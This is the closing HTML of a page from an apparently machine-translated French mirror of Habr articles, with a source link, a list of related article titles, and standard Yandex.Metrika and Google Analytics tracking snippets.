disponible <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr450126/">https://habr.com/ru/post/fr450126/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr450116/index.html">Syst√®mes d'exploitation: trois pi√®ces faciles. Partie 5: Planification: file d'attente de r√©troaction √† plusieurs niveaux (traduction)</a></li>
<li><a href="../fr450118/index.html">Diffusez l'√©cran sur plusieurs appareils sur le r√©seau</a></li>
<li><a href="../fr450120/index.html">Rechercher des images similaires, analyser un seul algorithme</a></li>
<li><a href="../fr450122/index.html">Startup Digest: Genetics (janvier - mars 2019)</a></li>
<li><a href="../fr450124/index.html">Configuration des cartes OsmAnd de la couche de carte thermique Strava</a></li>
<li><a href="../fr450128/index.html">Utilisation de l'optique Minolta AF (monture Sony A) sur les appareils photo sans miroir modernes de Sony</a></li>
<li><a href="../fr450130/index.html">Les √©quipes survivent-elles apr√®s le hackathon?</a></li>
<li><a href="../fr450132/index.html">Impossible d'expliquer la monade</a></li>
<li><a href="../fr450134/index.html">La deuxi√®me vie des bagues et des broches: comment recr√©er rapidement des bijoux en utilisant la technologie 3D</a></li>
<li><a href="../fr450136/index.html">Quand les murs ne suffisent pas. Comment prot√©ger les points de terminaison</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>